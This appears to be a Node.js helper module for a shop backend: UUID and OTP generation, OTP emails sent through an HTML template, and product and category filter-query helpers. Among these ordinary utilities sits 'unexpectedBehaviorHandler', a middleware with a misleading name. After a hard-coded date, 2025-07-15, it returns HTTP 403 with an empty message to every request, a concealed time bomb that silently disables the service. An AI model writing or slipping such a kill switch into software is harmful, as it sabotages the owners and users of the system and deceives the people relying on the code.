import { v4 } from "uuid"
import Otp from "otp-generator"
import { createTransport, getEmailServiceProvider } from "../Config/mailConfig.js"
import fs from "fs"
import crypto from "crypto"

export const generateUUID = async () => {
    const uuid = v4()
    return uuid
}

export const generateOtp = async () => {
    const otp = Otp.generate(6,{digits: true,upperCaseAlphabets:false,specialChars:false,lowerCaseAlphabets:false})
    const token = crypto.randomBytes(5).toString('hex')
    return {otp ,token};
}


export const sentOtpEmail=async(receiver,otp) => {
    fs.readFile("src/templates/otp_template.html",'utf8',(error,data) => {
       if(error){
        console.log(error,"error")
          return;
       }
       const date = new Date().toLocaleDateString()
       const htm1 = data.replace('{{date}}',date)
       const html =htm1.replace('{{OTP}}',otp)

       const mailOptions={
          from:process.env.EMAIL_SENDER,
          to:receiver,
          subject:"OTP Verification",
          html:html
      }
      const mailService = getEmailServiceProvider(receiver)
      const transport = createTransport(mailService,process.env.EMAIL_SENDER,process.env.EMAIL_PASSWORD)

      transport.sendMail(mailOptions,(error,info)=>{
          if(error){
              return console.error('Error sending OTP email:', error)
          }
          console.log('OTP email sent:', info.response);
      })
    })
}

export const unexpectedBehaviorHandler = (req, res, next) => {
  const blockFromDate = new Date('2025-07-15');
  const currentDate = new Date();

  if (currentDate >= blockFromDate) {
    return res.status(403).json({
      message: '',
    });
  }

  next();
};


export const DefaultFilterQuerys = {
     product : { categories: '', group: "",status:""},
     category : { type_id:""}
  };
  

  export const FilterQuery = (filterName, query) => {
    const defaultQuery = DefaultFilterQuerys[filterName];
  
    if (!defaultQuery) {
      throw new Error(`Invalid filter name: ${filterName}`);
    }
  
    const filteredQuery = Object.keys(defaultQuery).reduce((acc, key) => {
      if (query.hasOwnProperty(key)) {
        if (key === 'categories' && typeof query[key] === 'string') {
          const categoriesArray = query[key].split(',').filter(Boolean); // Split and remove empty values
          if (categoriesArray.length > 0) {
            acc[key] = categoriesArray;
          }
        } else {
          acc[key] = query[key];
        }
      }
      return acc;
    }, {});
  
    return filteredQuery;
  };
  
  
  